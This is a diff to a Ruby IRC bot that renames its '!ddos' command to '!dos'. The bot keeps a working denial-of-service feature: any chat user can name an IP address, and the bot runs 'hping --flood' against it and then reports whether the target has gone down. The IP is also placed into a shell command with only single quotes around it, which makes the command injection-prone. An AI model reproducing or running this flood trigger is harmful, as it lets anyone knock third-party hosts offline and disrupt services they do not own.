@@ -39,7 +39,7 @@ def get_ip m
 end
 
 def help m
-  m.reply "!cmds, !help, !version, !ddos [ip], !ping, !ping [ip], !code, !intra, !intra [on/off], #{SEARCH_ENGINES_KEYS}"
+  m.reply "!cmds, !help, !version, !dos [ip], !ping, !ping [ip], !code, !intra, !intra [on/off], #{SEARCH_ENGINES_KEYS}"
 end
 
 bot = Cinch::Bot.new do
@@ -127,24 +127,24 @@ bot = Cinch::Bot.new do
     m.reply "#{ip} ping> #{str}"
   end
 
-  DDOS_DURATION = "2s"
-  DDOS_WAIT = 5
-  on :message, /!ddos #{TARGET}\Z/ do |m|
-    @ddos ||= Mutex.new
-    if @ddos.try_lock
+  DOS_DURATION = "2s"
+  DOS_WAIT = 5
+  on :message, /!dos #{TARGET}\Z/ do |m|
+    @dos ||= Mutex.new
+    if @dos.try_lock
       begin
         ip = get_ip m
         m.reply "Begin attack against #{ip}"
-        s = `timeout #{DDOS_DURATION} hping --flood '#{ip}' 2>&1`
+        s = `timeout #{DOS_DURATION} hping --flood '#{ip}' 2>&1`
         s = s.split("\n")[3].to_s
         m.reply (Net::Ping::External.new(ip).ping? ? "failed :(" : "down !!!") + " " + s
-        sleep DDOS_WAIT
-        @ddos.unlock
+        sleep DOS_WAIT
+        @dos.unlock
       rescue
-        @ddos.unlock
+        @dos.unlock
       end
     else
-      m.reply "Wait for the end of the last ddos"
+      m.reply "Wait for the end of the last dos"
     end
   end
 
